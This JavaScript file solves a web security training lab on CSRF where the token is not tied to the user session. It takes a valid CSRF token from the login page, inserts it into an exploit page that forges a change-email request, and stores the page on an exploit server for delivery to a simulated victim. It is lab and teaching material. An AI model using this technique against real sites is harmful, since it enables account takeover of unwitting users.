import { parse } from "node-html-parser";
import { ExploitServer } from "../../../utils/exploitServer.js";
import { getParsedInput } from "../../../utils/getParsedInput.js";
import { createExploit } from "../utils/createExploit.js";

const { labUrl, httpClient } = getParsedInput({
  description: "Lab: CSRF where token is not tied to user session",
  proxy: true,
});

const exploit = await getExploit();
const exploitServer = await ExploitServer.create(labUrl, httpClient);
await exploitServer.storeExploit(exploit);

console.log(`To solve the lab:
  1. Visit ${exploitServer.url}
  2. Press "Deliver exploit to victim" button`);

async function getExploit() {
  const exploitFilePath = new URL("./exploit.html", import.meta.url);
  const actionUrl = labUrl + "my-account/change-email";
  const csrfToken = await getCsrfToken();
  return createExploit(exploitFilePath, { actionUrl, csrfToken });
}

async function getCsrfToken() {
  const { data: html } = await httpClient.get(labUrl + "login");
  return extractCsrfToken(html);
}

function extractCsrfToken(html) {
  const root = parse(html);
  const elem = root.querySelector(".login-form input[name='csrf']");
  return elem.getAttribute("value");
}
